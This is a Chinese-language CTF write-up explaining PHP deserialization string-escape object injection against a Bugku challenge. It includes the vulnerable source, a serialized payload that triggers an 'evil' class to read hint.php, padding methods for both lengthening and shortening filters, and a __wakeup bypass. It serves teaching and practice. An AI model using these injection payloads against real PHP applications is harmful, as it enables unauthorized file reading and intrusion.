---
title: PHP 反序列化与字符串逃逸
date: 2021-07-18 17:21:33
description: 
categories:
  - Pentest
tags:
  - 反序列化
---

### 0x00 漏洞成因
该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之后

### 0x01 条件
* 相邻两个属性的值是我们可以控制的
* 前一个属性的 s 长度可以发生变化（变长变短都可以）
    * 若变长则可以直接在该属性中注入对象来达到反序列化
    * 若变短则可以吞掉后面相邻属性的值，在后面的属性中注入新的对象

### 0x02 题目
Bugku CTF 的题
```php
<?php
// php版本:5.4.44
header("Content-type: text/html; charset=utf-8");
// highlight_file(__FILE__);

class evil{
    public $hint;
    public function __construct($hint){
        $this->hint = $hint;
    }
    public function __destruct(){
        if($this->hint==="hint.php") {
            @$this->hint = base64_encode(file_get_contents($this->hint)); 
        }
        var_dump($this->hint);
    }
    function __wakeup() { 
        if ($this->hint != "╭(●｀∀´●)╯") { 
            //There's a hint in ./hint.php
            $this->hint = "╰(●’◡’●)╮"; 
        } 
    }
}

class User
{
    public $username;
    public $password;
    public function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
    }

}

function filter($data){
    $data = str_replace('123', 'abcdef', $data);
    return $data;
}

$username = $_POST['username'];
$password = $_POST['password'];

$a = serialize(new User($username, $password));
if(preg_match('/flag/is', $a))
    die("NoNoNo!");

$w = filter($a);
unserialize($w);
?>
```

### 0x03 分析
* 可以看到我们可以传入 username 和 password 触发 User 类，而我们需要触发 evil 类从而获取 hint.php
* 题目中序列化了 User 类然后结果被方法 write 和 read 处理后再反序列化
* filter 一个是将序列化后的字符串变长的函数
* 我们可以序列化 eval 类并作为参数传入 User，将 eval 当作 User 的一个元素从而触发 eval

### 0x04 获取触发 evil 的序列化字符串
```php
<?php
class evil{
    public $hint;
    public function __construct($hint){
        $this->hint = $hint;
    }
}

var_dump(serialize(new evil("hint.php")));
?>
```
输出 `payload：O:4:"evil":1:{s:4:"hint";s:8:"hint.php";}`

### 0x05 利用(过滤后变长)
经过 filter 函数后，序列化的字符串中的 123 会被替换为 abcdef，整体来说遇到一个 123 字符串就会变长 3

```php
$a = serialize(new User($username, $password));
if(preg_match('/flag/is', $a))
    die("NoNoNo!");

var_dump($a);
echo "<br>";

$w = filter($a);
var_dump($w);
echo "<br>";

unserialize($w);
```
post username=111&password=222，经过 filter 后输出
```php
O:4:"User":2:{s:8:"username";s:3:"111";s:8:"password";s:3:"222";}
```

可以看出其实可控的是 111 及后面的 222，我们需要将 User 类序列化的字符串想办法构造为

`O:4:"User":2:{s:8:"username";s:4:"111";     s:8:"password";`<f>序列化后的 evil 字符串</f>;}

当我们传入构造后的序列化 payload 后
![](/img/post/16258097627342.jpg)

上图中，位置 2 在序列化的字符串中其实是 username 的值，是一个字符串，若我们在 1 的位置插入 60 个字符

则 username 的值为我们插入的 60 个字符，而 password 的值则为 payload <f>`O:4:"evil":1:{s:4:"hint";s:8:"hint.php";}`</f>，后面 3 位置的字符串失效，当反序列化时即可触发 evil，构造后如下图：
![](/img/post/16258101773735.jpg)
将 payload 中 evil 的属性个数改为大于存在的属性个数即可绕过 wakeup，最终得到 hint.php 的内容
![](/img/post/16258103107382.jpg)

### 0x06 延伸(过滤后变短)
更改 filter 函数，经过处理后序列号字符串变短
```php
function filter($data){
    $data = str_replace('abcdef', '123', $data);
    return $data;
}
```
若处理后变短则可以吞掉后面相邻属性的值，所以可以在后面的属性中注入新的对象

前面的属性经过处理后变短，需要我们填充垃圾字符串，使长度和原来相同，就会注入 evil 对象即可
![](/img/post/16258114498309.jpg)

从上图可以看出，输入的字符串被替换为了 123123，但是显示的长度还是 12，位数不对时反序列化就会出错

我们需要把位置 1 的数字和位置 2 的字符串的位数设置为相同，这样反序列化不会出错且位置 3 还会触发 evil

具体如下，可触发 evil 得到 hint.php 中的内容：
![](/img/post/16258119470950.jpg)


#### Reference(侵删)：
* [https://blog.csdn.net/qq_25755011/article/details/115950424](https://blog.csdn.net/qq_25755011/article/details/115950424?_blank)
* [https://www.cnblogs.com/tr1ple/p/11876441.html](https://www.cnblogs.com/tr1ple/p/11876441.html?_blank)
* [https://cloud.tencent.com/developer/article/1627299](https://cloud.tencent.com/developer/article/1627299?_blank)
